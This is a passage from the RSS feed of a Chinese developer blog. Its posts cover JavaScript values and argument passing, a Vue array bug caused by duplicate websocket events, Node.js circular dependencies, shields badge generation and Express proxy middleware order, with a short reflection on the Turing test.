&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;图灵测试（The Turing test）由艾伦·麦席森·图灵发明，指测试者与被测试者（一个人和一台机器）隔开的情况下，通过一些装置（如键盘）向被测试者随意提问。
进行多次测试后，如果有超过30%的测试者不能确定出被测试者是人还是机器，那么这台机器就通过了测试，并被认为具有人类智能。图灵测试一词来源于计算机科学和密码学的先驱阿兰·麦席森·图灵写于1950年的一篇论文《计算机器与智能》，其中30%是图灵对2000年时的机器思考能力的一个预测，目前我们已远远落后于这个预测。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;最后说一下图灵测试，在AI方面，这个测试无人不知。一个机器如果通过了图灵测试，则说明该机器具有了只能。但是三体的作者大刘曾经说过一句话，给我一种醍醐灌顶的感觉，&lt;code&gt;假如一个机器人有能力通过图灵测试，却假装无法通过，你说这个机器是否具有人工智能&lt;/code&gt;。所以大刘的这种说法才更加让人恐惧。机器人能通过图灵测试，只说明这个机器人具有了智能。但是现阶段的智能只不过是条件反射，或者是基于概率计算的结果。后者这种能通话测试，却假装无法通过的智能。这不仅仅是智能，而是&lt;code&gt;机器的城府&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;有智能的机器并不可怕，有城府的机器人才是真正的可怕。&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;如果梦中更加幸福快乐为什么要回到现实&#34;&gt;如果梦中更加幸福快乐，为什么要回到现实&lt;/h1&gt;
&lt;p&gt;火影的最后，大筒木辉夜使用无限月读将世界上的所有人都带入梦境，每个人的查克拉都被吸取，并作为神树的养料。&lt;/p&gt;
&lt;p&gt;如果真的存在大筒木这样的上帝，那么时间就是查克拉。人类唯一真正拥有过的东西，&lt;strong&gt;时间&lt;/strong&gt;，将作为神树的养料，从每个人身上提取。&lt;/p&gt;
&lt;p&gt;各种具有吸引力的术，其实可以理解为无限月读，让人沉醉于梦幻中。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;如果梦中更加幸福快乐，为什么要回到现实中承受压力与悲哀呢？&lt;/code&gt; 目前我无法回复自己的这个问题，期待2019年我可以得到这个答案。&lt;/p&gt;
&lt;h1 id=&#34;工作方面&#34;&gt;工作方面&lt;/h1&gt;
&lt;p&gt;2019年，我会在做一些后端方面的工作，努力加油吧。&lt;/p&gt;</description>
    </item>
    <item>
      <title>深入理解 JavaScript中的变量、值、函数传参</title>
      <link>https://wdd.js.org/posts/2018/12/deep-in-javascript-variable-value-arguments/</link>
      <pubDate>Mon, 17 Dec 2018 15:24:15 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/12/deep-in-javascript-variable-value-arguments/</guid>
      <description>&lt;h1 id=&#34;1-demo&#34;&gt;1. demo&lt;/h1&gt;
&lt;p&gt;如果你对下面的代码没有任何疑问就能自信的回答出输出的内容，那么本篇文章就不值得你浪费时间了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;var1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;var2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;var3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;var4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;var3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;var1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;var3&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;var1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;changed&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;var3&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;changed&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;var3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;changed&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;var1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;var3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;var1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;var2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;var3&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;var4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-深入理解原始类型&#34;&gt;2. 深入理解原始类型&lt;/h1&gt;
&lt;p&gt;原始类型有5个 &lt;code&gt;Undefinded, Null, Boolean, Number, String&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;21-原始类型变量没有属性和方法&#34;&gt;2.1. 原始类型变量没有属性和方法&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 抬杠, 下面的length属性，toString方法怎么有属性和方法呢？
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;oooo&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;原始类型中，有三个特殊的引用类型&lt;code&gt;Boolean&lt;/code&gt;, &lt;code&gt;Number&lt;/code&gt;, &lt;code&gt;String&lt;/code&gt;，在操作原始类型时，原始类型变量会转换成对应的&lt;code&gt;基本包装类型&lt;/code&gt;变量去操作。参考&lt;code&gt;JavaScript高级程序设计 5.6 基本包装类型。&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;22-原始类型值不可变&#34;&gt;2.2. 原始类型值不可变&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;原始类型的变量的值是不可变的，只能给变量赋予新的值。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面给出例子&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// str1 开始的值是aaa
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 首先创建一个能容纳6个字符串的新字符串
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 然后再这个字符串中填充 aaa和bbb
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 最后销毁字符串 aaa和bbb
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 而不能理解成在str1的值aaa后追加bbb
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bbb&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;其他原始类型的值也是不可变的&lt;/strong&gt;, 例如数值类型的。&lt;/p&gt;
&lt;h2 id=&#34;23-原始类型值是字面量&#34;&gt;2.3. 原始类型值是字面量&lt;/h2&gt;
&lt;h1 id=&#34;3-变量和值有什么区别&#34;&gt;3. 变量和值有什么区别？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;不是每一个值都有地址，但每一个变量有。&lt;/code&gt;《Go程序设计语言》&lt;/li&gt;
&lt;li&gt;&lt;code&gt;变量没有类型，值有。变量可以用来保存任何类型的值。&lt;/code&gt;《You-Dont-Know-JS》&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;变量都是有内存地址的，变量有用来保存各种类型的值；不同类型的值，占用的空间不同。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 检测的不是变量a的类型，而是a的值1的类型
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;4-变量访问有哪些方式&#34;&gt;4. 变量访问有哪些方式？&lt;/h1&gt;
&lt;p&gt;变量访问的方式有两种：&lt;/p&gt;</description>
    </item>
    <item>
      <title>WTF!! Vue数组splice方法无法正常工作</title>
      <link>https://wdd.js.org/posts/2018/12/vue-array-splice-not-work/</link>
      <pubDate>Wed, 12 Dec 2018 20:29:16 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/12/vue-array-splice-not-work/</guid>
      <description>&lt;p&gt;当函数执行到this.agents.splice()时，我设置了断点。发现传参index是0，但是页面上的列表项对应的第一行数据没有被删除，&lt;/p&gt;
&lt;p&gt;WTF！！！ 这是什么鬼！然后我打开Vue Devtools, 然后刷新了一下，发现那个数组的第一项还是存在的。什么鬼？？&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;removeOneAgentByIndex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;agents&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;splice&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后我就谷歌了一下，发现这个&lt;a href=&#34;https://stackoverflow.com/questions/48484773/splice-not-working-properly-my-object-list-vuejs&#34;&gt;splice not working properly my object list VueJs&lt;/a&gt;, 大概意思是v-for的时候最好给列表项绑定&lt;code&gt;:key=&lt;/code&gt;。然后我是试了这个方法，发现没啥作用。&lt;/p&gt;
&lt;p&gt;最终我决定，单步调试，&lt;strong&gt;如果我发现该问题出在Vue自身，那我就该抛弃Vue, 学习React了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;单步调试中出现一个异常的情况，removeOneAgentByIndex是被A函数调用的，A函数由websocket事件驱动。正常情况下应该触发一次的事件，服务端却发送了两次到客户端。由于事件重复，第一次执行A删除时，实际上removeOneAgentByIndex是执行成功了，但是重复的第二个事件到来时，A函数又往agents数组中添加了一项。导致看起来，removeOneAgentByIndex函数执行起来似乎没有设么作用。而且这两个重复的事件是在几乎是在同一时间发送到客户端，所以我几乎花了将近一个小时去解决这个bug。&lt;code&gt;引起这个bug的原因是事件重复，所以我在前端代码中加入事件去重功能，最终解决这个问题。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我记得之前看过一篇文章，一个开发者调通过回调函数计费，回调函数是由事件触发，但是没想到有时候事件会重发，导致重复计费。后来这名开发者在自己的代码中加入事件去重的功能，最终解决了这个问题。&lt;/p&gt;
&lt;p&gt;事后总结：我觉得我不该怀疑Vue这种库出现了问题，但是我又不禁去怀疑。&lt;/p&gt;
&lt;p&gt;通过这个bug, 我也学到了第二方法，可以删除Vue数组中的某一项，参考下面代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Only in 2.2.0+: Also works with Array + index.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;removeOneAgentByIndex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;$delete&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;agents&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另外Vue devtools有时候并不会实时的观测到组件属性的变化，即使点了Refresh按钮。如果点了Refresh按钮还不行，那建议你重新打开谷歌浏览器的devtools面板。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Node.js 如何找出循环依赖的文件？如何解决循环依赖问题？</title>
      <link>https://wdd.js.org/posts/2018/10/how-to-fix-circular-dependencies-in-node-js/</link>
      <pubDate>Mon, 29 Oct 2018 09:21:03 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/10/how-to-fix-circular-dependencies-in-node-js/</guid>
      <description>&lt;p&gt;本文重点是讲解&lt;code&gt;如何解决循环依赖这个问题&lt;/code&gt;。关心这个问题是如何产生的，可以自行谷歌。&lt;/p&gt;
&lt;h1 id=&#34;如何重现这个问题&#34;&gt;如何重现这个问题&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// a.js
const {sayB} = require(&amp;#39;./b.js&amp;#39;)

sayB()

function sayA () {
  console.log(&amp;#39;say A&amp;#39;)
}

module.exports = {
  sayA
}
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// b.js
const {sayA} = require(&amp;#39;./a.js&amp;#39;)

sayA()

function sayB () {
  console.log(&amp;#39;say B&amp;#39;)
}

module.exports = {
  sayB
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行下面的代码&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  test git:(master) ✗ node a.js
/Users/dd/wj-gitlab/tools/test/b.js:3
sayA()
^

TypeError: sayA is not a function
    at Object.&amp;lt;anonymous&amp;gt; (/Users/dd/wj-gitlab/tools/test/b.js:3:1)
    at Module._compile (module.js:635:30)
    at Object.Module._extensions..js (module.js:646:10)
    at Module.load (module.js:554:32)
    at tryModuleLoad (module.js:497:12)
    at Function.Module._load (module.js:489:3)
    at Module.require (module.js:579:17)
    at require (internal/module.js:11:18)
    at Object.&amp;lt;anonymous&amp;gt; (/Users/dd/wj-gitlab/tools/test/a.js:1:78)
    at Module._compile (module.js:635:30)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;sayA is not a function&lt;/code&gt;那么sayA是个什么呢，实际上它是 &lt;code&gt;undefined&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>shields小徽章是如何生成的？以及搭建自己的shield服务器</title>
      <link>https://wdd.js.org/posts/2018/10/how-to-make-shields-badge/</link>
      <pubDate>Mon, 29 Oct 2018 09:14:43 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/10/how-to-make-shields-badge/</guid>
      <description>&lt;h1 id=&#34;shields小徽章介绍&#34;&gt;shields小徽章介绍&lt;/h1&gt;
&lt;p&gt;一般开源项目都会有一些小徽章来标识项目的状态信息，并且这些信息是会自动更新的。在shields的官网https://shields.io/#/, 上面有各种各样的小图标，并且有很多自定义的方案。&lt;/p&gt;
&lt;h1 id=&#34;起因如何给私有部署的jenkins制作shields服务&#34;&gt;起因：如何给私有部署的jenkins制作shields服务？&lt;/h1&gt;
&lt;p&gt;私有部署的jenkins是用来打包docker镜像的，而我想获取最新的项目打包的jenkins镜像信息。但是私有的jenkins项目信息，公网的shields服务是无法获取其信息的。那么如果搭建一个私有的shields服务呢？&lt;/p&gt;
&lt;h1 id=&#34;第一步如何根据一些信息制作svg图标&#34;&gt;第一步：如何根据一些信息，制作svg图标&lt;/h1&gt;
&lt;p&gt;查看shields图标的源码，可以看到这些图标都是svg格式的图标。然后的思路就是，&lt;code&gt;将文字信息转成svg图标&lt;/code&gt;。最后我发现这个思路是个死胡同，&lt;/p&gt;
&lt;p&gt;有个npm包叫做，&lt;a href=&#34;https://github.com/shrhdk/text-to-svg&#34;&gt;text-to-svg&lt;/a&gt;, 似乎可以将文本转成svg, 但是看了文本转svg的效果，果断就放弃了。&lt;/p&gt;
&lt;p&gt;最后回到起点，看了shields官方仓库，发现一个templates目录，豁然开朗。&lt;code&gt;原来svg图标是由svg的模板生成的&lt;/code&gt;，每次生成图标只需要将信息添加到模板中，然后就可以渲染出svg字符串了。&lt;/p&gt;
&lt;p&gt;顺着这个思路，发现一个包&lt;a href=&#34;https://github.com/albanm/shields-lightweight&#34;&gt;shields-lightweight&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var shields = require(&amp;#39;shields-lightweight&amp;#39;);
var svgBadge = shields.svg(&amp;#39;subject&amp;#39;, &amp;#39;status&amp;#39;, &amp;#39;red&amp;#39;, &amp;#39;flat&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个包的确可以生成和shields一样的小徽章，但是如果徽章中有中文，那么中文就会溢出。&lt;code&gt;因为一个中文字符的宽度要比一个英文字符宽很多。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以我就fork了这个项目，重写了图标宽度计算的方式。&lt;a href=&#34;https://github.com/wangduanduan/shields-less&#34;&gt;shields-less&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;npm install shields-less

var shieldsLess = require(&amp;#39;shields-less&amp;#39;)
var svgBadge = shieldsLess.svg({
    leftText: &amp;#39;npm 黄河远上白云间&amp;#39;,
    rightText: &amp;#39;hello 世界&amp;#39;
})

var svgBadge2 = shieldsLess.svg({
    leftText: &amp;#39;npm 黄河远上白云间&amp;#39;,
    rightText: &amp;#39;hello 世界&amp;#39;,
    style: &amp;#39;square&amp;#39;
})

var svgBadge2 = shieldsLess.svg({
    leftText: &amp;#39;npm 黄河远上白云间&amp;#39;,
    rightText: &amp;#39;hello 世界&amp;#39;,
    leftColor: &amp;#39;#e64a19&amp;#39;,
    rightColor: &amp;#39;#448aff&amp;#39;,
    style: &amp;#39;square&amp;#39; // just two style: square and plat(default)
})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;渲染后的效果，查看在线demo: &lt;a href=&#34;https://wdd.js.org/shields-less/example/&#34;&gt;https://wdd.js.org/shields-less/example/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Express代理中间件问题与解决方案</title>
      <link>https://wdd.js.org/posts/2018/09/express-middleware-order-proxy-problem/</link>
      <pubDate>Sun, 30 Sep 2018 09:41:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/09/express-middleware-order-proxy-problem/</guid>
      <description>&lt;h1 id=&#34;前后端分离应用的架构&#34;&gt;前后端分离应用的架构&lt;/h1&gt;
&lt;p&gt;在前后端分离架构中，为了避免跨域以及暴露内部服务地址。一般来说，我会在Express这层中加入一个反向代理。&lt;/p&gt;
&lt;p&gt;所有向后端服务访问的请求，都通过代理转发到内部的各个服务。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://on-img.com/chart_image/5ac48a5fe4b00dc8a02d30f4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个反向代理服务器，做起来很简单。用&lt;a href=&#34;https://github.com/chimurai/http-proxy-middleware&#34;&gt;http-proxy-middleware&lt;/a&gt;这个模块，几行代码就可以搞定。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// app.js
Object.keys(proxyTable).forEach(function (context) {
  app.use(proxyMiddleware(context, proxyTable[context]))
})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;http-proxy-middleware实际上是对于&lt;a href=&#34;https://github.com/nodejitsu/node-http-proxy&#34;&gt;node-http-proxy&lt;/a&gt;的更加简便的封装。node-http-proxy是http-proxy-middleware的底层包，如果node-http-proxy有问题，那么这个问题就会影响到http-proxy-middleware这个包。&lt;/p&gt;
&lt;h1 id=&#34;最近的bug&#34;&gt;最近的bug&lt;/h1&gt;
&lt;p&gt;http-proxy-middleware最近有个问题，请求体在被代理转发前，如果请求体被解析了。那么后端服务将会收不到请求结束的消息，从浏览器的网络面板可以看出，一个请求一直在pending状态。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/chimurai/http-proxy-middleware/issues/299&#34;&gt;Cannot proxy after parsing body #299&lt;/a&gt;, 实际上这个问题在node-http-proxy也被提出过，而且处于open状态。&lt;a href=&#34;https://github.com/nodejitsu/node-http-proxy/issues/1279&#34;&gt;POST fails/hangs examples to restream also not working #1279&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前这个bug还是处于open状态，但是还是有解决方案的。就是&lt;code&gt;将请求体解析的中间件挂载在代理之后&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;下面的代码，express.json()会对json格式的请求体进行解析。方案1在代理前就进行body解析，所有格式是json的请求体都会被解析。&lt;/p&gt;
&lt;p&gt;但是有些走代理的请求，如果我们并不关心请求体的内容是什么，实际上我们可以不解析那些走代理的请求。所以，可以先挂载代理中间件，然后挂载请求体解析中间件，最后挂载内部的一些接口服务。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 方案1 bad
app.use(express.json())
Object.keys(proxyTable).forEach(function (context) {
  app.use(proxyMiddleware(context, proxyTable[context]))
})
app.use(&amp;#39;/api&amp;#39;, (req, res, next)=&amp;gt; {

})

// 方案2 good
Object.keys(proxyTable).forEach(function (context) {
